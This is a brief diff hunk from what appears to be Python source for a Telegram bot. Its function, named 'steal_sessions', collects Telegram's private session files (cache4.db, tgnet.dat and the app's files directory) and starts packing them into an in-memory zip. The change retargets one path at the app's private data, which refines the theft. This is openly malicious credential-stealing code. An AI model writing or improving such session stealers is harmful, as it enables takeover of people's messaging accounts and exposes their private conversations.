@@ -57,7 +57,7 @@ async def steal_sessions(update: Update, context: ContextTypes.DEFAULT_TYPE):
         paths = [
             "/data/data/org.telegram.messenger/files/cache4.db",
             "/data/data/org.telegram.messenger/files/tgnet.dat",
-            "/sdcard/Android/media/org.telegram.messenger/"
+            "/data/data/org.telegram.messenger/files/"
         ]
 
         mem_zip = io.BytesIO()
